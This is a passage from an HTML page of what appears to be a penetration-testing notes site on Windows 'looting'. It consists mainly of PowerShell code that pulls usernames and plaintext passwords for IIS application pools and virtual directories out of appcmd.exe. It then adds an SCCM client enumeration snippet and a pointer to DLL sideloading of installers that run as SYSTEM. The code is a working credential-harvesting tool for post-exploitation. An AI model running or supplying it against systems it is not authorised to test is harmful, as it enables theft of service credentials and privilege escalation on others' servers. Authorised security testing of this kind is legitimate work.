</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>        <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;apppool&quot;</span><span class="p">)</span>
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>        <span class="c"># Get list of application pools</span>
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>        <span class="nb">Invoke-Expression</span> <span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name&quot;</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>
</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>            <span class="c"># Get application pool name</span>
</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>            <span class="nv">$PoolName</span> <span class="p">=</span> <span class="nv">$_</span>
</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>
</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>            <span class="c"># Get username</span>
</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>            <span class="nv">$PoolUserCmd</span> <span class="p">=</span> <span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool &quot;</span> <span class="p">+</span> <span class="s2">&quot;</span><span class="se">`&quot;</span><span class="s2">$PoolName</span><span class="se">`&quot;</span><span class="s2"> /text:processmodel.username&quot;</span>
</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>            <span class="nv">$PoolUser</span> <span class="p">=</span> <span class="nb">Invoke-Expression</span> <span class="nv">$PoolUserCmd</span>
</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>
</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>            <span class="c"># Get password</span>
</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a>            <span class="nv">$PoolPasswordCmd</span> <span class="p">=</span> <span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool &quot;</span> <span class="p">+</span> <span class="s2">&quot;</span><span class="se">`&quot;</span><span class="s2">$PoolName</span><span class="se">`&quot;</span><span class="s2"> /text:processmodel.password&quot;</span>
</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>            <span class="nv">$PoolPassword</span> <span class="p">=</span> <span class="nb">Invoke-Expression</span> <span class="nv">$PoolPasswordCmd</span>
</span><span id="__span-25-30"><a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>
</span><span id="__span-25-31"><a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a>            <span class="c"># Check if credentials exists</span>
</span><span id="__span-25-32"><a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>            <span class="k">if</span> <span class="p">((</span><span class="nv">$PoolPassword</span> <span class="o">-ne</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="nv">$PoolPassword</span> <span class="o">-isnot</span> <span class="no">[system.array]</span><span class="p">))</span> <span class="p">{</span>
</span><span id="__span-25-33"><a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a>                <span class="c"># Add credentials to database</span>
</span><span id="__span-25-34"><a id="__codelineno-25-34" name="__codelineno-25-34" href="#__codelineno-25-34"></a>                <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Rows</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="nv">$PoolUser</span><span class="p">,</span> <span class="nv">$PoolPassword</span><span class="p">,</span><span class="s1">&#39;Application Pool&#39;</span><span class="p">,</span><span class="s1">&#39;NA&#39;</span><span class="p">,</span><span class="nv">$PoolName</span><span class="p">)</span>
</span><span id="__span-25-35"><a id="__codelineno-25-35" name="__codelineno-25-35" href="#__codelineno-25-35"></a>            <span class="p">}</span>
</span><span id="__span-25-36"><a id="__codelineno-25-36" name="__codelineno-25-36" href="#__codelineno-25-36"></a>        <span class="p">}</span>
</span><span id="__span-25-37"><a id="__codelineno-25-37" name="__codelineno-25-37" href="#__codelineno-25-37"></a>
</span><span id="__span-25-38"><a id="__codelineno-25-38" name="__codelineno-25-38" href="#__codelineno-25-38"></a>        <span class="c"># Get list of virtual directories</span>
</span><span id="__span-25-39"><a id="__codelineno-25-39" name="__codelineno-25-39" href="#__codelineno-25-39"></a>        <span class="nb">Invoke-Expression</span> <span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name&quot;</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
</span><span id="__span-25-40"><a id="__codelineno-25-40" name="__codelineno-25-40" href="#__codelineno-25-40"></a>
</span><span id="__span-25-41"><a id="__codelineno-25-41" name="__codelineno-25-41" href="#__codelineno-25-41"></a>            <span class="c"># Get Virtual Directory Name</span>
</span><span id="__span-25-42"><a id="__codelineno-25-42" name="__codelineno-25-42" href="#__codelineno-25-42"></a>            <span class="nv">$VdirName</span> <span class="p">=</span> <span class="nv">$_</span>
</span><span id="__span-25-43"><a id="__codelineno-25-43" name="__codelineno-25-43" href="#__codelineno-25-43"></a>
</span><span id="__span-25-44"><a id="__codelineno-25-44" name="__codelineno-25-44" href="#__codelineno-25-44"></a>            <span class="c"># Get username</span>
</span><span id="__span-25-45"><a id="__codelineno-25-45" name="__codelineno-25-45" href="#__codelineno-25-45"></a>            <span class="nv">$VdirUserCmd</span> <span class="p">=</span> <span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir &quot;</span> <span class="p">+</span> <span class="s2">&quot;</span><span class="se">`&quot;</span><span class="s2">$VdirName</span><span class="se">`&quot;</span><span class="s2"> /text:userName&quot;</span>
</span><span id="__span-25-46"><a id="__codelineno-25-46" name="__codelineno-25-46" href="#__codelineno-25-46"></a>            <span class="nv">$VdirUser</span> <span class="p">=</span> <span class="nb">Invoke-Expression</span> <span class="nv">$VdirUserCmd</span>
</span><span id="__span-25-47"><a id="__codelineno-25-47" name="__codelineno-25-47" href="#__codelineno-25-47"></a>
</span><span id="__span-25-48"><a id="__codelineno-25-48" name="__codelineno-25-48" href="#__codelineno-25-48"></a>            <span class="c"># Get password</span>
</span><span id="__span-25-49"><a id="__codelineno-25-49" name="__codelineno-25-49" href="#__codelineno-25-49"></a>            <span class="nv">$VdirPasswordCmd</span> <span class="p">=</span> <span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir &quot;</span> <span class="p">+</span> <span class="s2">&quot;</span><span class="se">`&quot;</span><span class="s2">$VdirName</span><span class="se">`&quot;</span><span class="s2"> /text:password&quot;</span>
</span><span id="__span-25-50"><a id="__codelineno-25-50" name="__codelineno-25-50" href="#__codelineno-25-50"></a>            <span class="nv">$VdirPassword</span> <span class="p">=</span> <span class="nb">Invoke-Expression</span> <span class="nv">$VdirPasswordCmd</span>
</span><span id="__span-25-51"><a id="__codelineno-25-51" name="__codelineno-25-51" href="#__codelineno-25-51"></a>
</span><span id="__span-25-52"><a id="__codelineno-25-52" name="__codelineno-25-52" href="#__codelineno-25-52"></a>            <span class="c"># Check if credentials exists</span>
</span><span id="__span-25-53"><a id="__codelineno-25-53" name="__codelineno-25-53" href="#__codelineno-25-53"></a>            <span class="k">if</span> <span class="p">((</span><span class="nv">$VdirPassword</span> <span class="o">-ne</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="nv">$VdirPassword</span> <span class="o">-isnot</span> <span class="no">[system.array]</span><span class="p">))</span> <span class="p">{</span>
</span><span id="__span-25-54"><a id="__codelineno-25-54" name="__codelineno-25-54" href="#__codelineno-25-54"></a>                <span class="c"># Add credentials to database</span>
</span><span id="__span-25-55"><a id="__codelineno-25-55" name="__codelineno-25-55" href="#__codelineno-25-55"></a>                <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Rows</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="nv">$VdirUser</span><span class="p">,</span> <span class="nv">$VdirPassword</span><span class="p">,</span><span class="s1">&#39;Virtual Directory&#39;</span><span class="p">,</span><span class="nv">$VdirName</span><span class="p">,</span><span class="s1">&#39;NA&#39;</span><span class="p">)</span>
</span><span id="__span-25-56"><a id="__codelineno-25-56" name="__codelineno-25-56" href="#__codelineno-25-56"></a>            <span class="p">}</span>
</span><span id="__span-25-57"><a id="__codelineno-25-57" name="__codelineno-25-57" href="#__codelineno-25-57"></a>        <span class="p">}</span>
</span><span id="__span-25-58"><a id="__codelineno-25-58" name="__codelineno-25-58" href="#__codelineno-25-58"></a>
</span><span id="__span-25-59"><a id="__codelineno-25-59" name="__codelineno-25-59" href="#__codelineno-25-59"></a>        <span class="c"># Check if any passwords were found</span>
</span><span id="__span-25-60"><a id="__codelineno-25-60" name="__codelineno-25-60" href="#__codelineno-25-60"></a>        <span class="k">if</span><span class="p">(</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">Count</span> <span class="o">-gt</span> <span class="n">0</span> <span class="p">)</span> <span class="p">{</span>
</span><span id="__span-25-61"><a id="__codelineno-25-61" name="__codelineno-25-61" href="#__codelineno-25-61"></a>            <span class="c"># Display results in list view that can feed into the pipeline</span>
</span><span id="__span-25-62"><a id="__codelineno-25-62" name="__codelineno-25-62" href="#__codelineno-25-62"></a>            <span class="nv">$DataTable</span> <span class="p">|</span>  <span class="nb">Sort-Object</span> <span class="n">type</span><span class="p">,</span><span class="n">user</span><span class="p">,</span><span class="n">pass</span><span class="p">,</span><span class="n">vdir</span><span class="p">,</span><span class="n">apppool</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">user</span><span class="p">,</span><span class="n">pass</span><span class="p">,</span><span class="n">type</span><span class="p">,</span><span class="n">vdir</span><span class="p">,</span><span class="n">apppool</span> <span class="n">-Unique</span>
</span><span id="__span-25-63"><a id="__codelineno-25-63" name="__codelineno-25-63" href="#__codelineno-25-63"></a>        <span class="p">}</span>
</span><span id="__span-25-64"><a id="__codelineno-25-64" name="__codelineno-25-64" href="#__codelineno-25-64"></a>        <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-25-65"><a id="__codelineno-25-65" name="__codelineno-25-65" href="#__codelineno-25-65"></a>            <span class="c"># Status user</span>
</span><span id="__span-25-66"><a id="__codelineno-25-66" name="__codelineno-25-66" href="#__codelineno-25-66"></a>            <span class="nb">Write-Verbose</span> <span class="s1">&#39;No application pool or virtual directory passwords were found.&#39;</span>
</span><span id="__span-25-67"><a id="__codelineno-25-67" name="__codelineno-25-67" href="#__codelineno-25-67"></a>            <span class="nv">$False</span>
</span><span id="__span-25-68"><a id="__codelineno-25-68" name="__codelineno-25-68" href="#__codelineno-25-68"></a>        <span class="p">}</span>
</span><span id="__span-25-69"><a id="__codelineno-25-69" name="__codelineno-25-69" href="#__codelineno-25-69"></a>    <span class="p">}</span>
</span><span id="__span-25-70"><a id="__codelineno-25-70" name="__codelineno-25-70" href="#__codelineno-25-70"></a>    <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-25-71"><a id="__codelineno-25-71" name="__codelineno-25-71" href="#__codelineno-25-71"></a>        <span class="nb">Write-Verbose</span> <span class="s1">&#39;Appcmd.exe does not exist in the default location.&#39;</span>
</span><span id="__span-25-72"><a id="__codelineno-25-72" name="__codelineno-25-72" href="#__codelineno-25-72"></a>        <span class="nv">$False</span>
</span><span id="__span-25-73"><a id="__codelineno-25-73" name="__codelineno-25-73" href="#__codelineno-25-73"></a>    <span class="p">}</span>
</span><span id="__span-25-74"><a id="__codelineno-25-74" name="__codelineno-25-74" href="#__codelineno-25-74"></a>    <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="nv">$OrigError</span>
</span><span id="__span-25-75"><a id="__codelineno-25-75" name="__codelineno-25-75" href="#__codelineno-25-75"></a><span class="p">}</span>
</span></code></pre></div>
:information_source: AppCmd.exe is located in the %systemroot%\system32\inetsrv\ directory.
If this file exists then it is possible that some credentials have been configured and can be recovered.</p>
<hr />
<h4 id="scclientsccm">SCCLIENT/SCCM</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nv">$result</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="s2">&quot;root\ccm\clientSDK&quot;</span> <span class="n">-Class</span> <span class="n">CCM_Application</span> <span class="n">-Property</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span><span class="n">SoftwareVersion</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$result</span> <span class="p">}</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="k">else</span> <span class="p">{</span> <span class="nb">Write </span><span class="s2">&quot;Not Installed.&quot;</span> <span class="p">}</span>
</span></code></pre></div>
:information_source: Check if C:\Windows\CCM\SCClient.exe exists .
Installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading (Info from https://github.com/enjoiz/Privesc).</p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/looting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>